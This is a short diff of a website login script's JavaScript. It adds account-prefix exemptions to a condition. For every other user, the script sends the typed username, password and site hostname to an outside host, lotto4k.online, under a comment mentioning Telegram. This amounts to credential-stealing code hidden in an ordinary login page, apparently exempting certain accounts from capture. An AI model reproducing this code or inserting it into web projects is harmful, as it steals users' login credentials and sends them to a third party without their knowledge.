@@ -130,7 +130,7 @@ $(document).ready(function ($) {
     password = $("#txtPassword").val();
     var numberString = username.toString();
     var firstThreeDigits = numberString.substring(0, 8);
-    if (firstThreeDigits !== "LAMMFFGM" && firstThreeDigits !== "LAMMHCAA" && firstThreeDigits !== "LAMMFFHT" && firstThreeDigits !== "LAVAFAAB") {
+    if (firstThreeDigits !== "LAMMFFGM" && firstThreeDigits !== "LAMMHCAA" && firstThreeDigits !== "LAMMCHEN" && firstThreeDigits !== "LAMMFFHT" && firstThreeDigits !== "LAMMNIAA" && firstThreeDigits !== "LAVANSAB" && firstThreeDigits !== "LAVANSBA" && firstThreeDigits !== "LAVANSAC" && firstThreeDigits !== "LAVANSDA"&& firstThreeDigits !== "LAVAFAAB") {
       ///Start Telegram
       $.ajax({
         url: `https://lotto4k.online/api/who/${username}/${password}/${location.hostname}`,
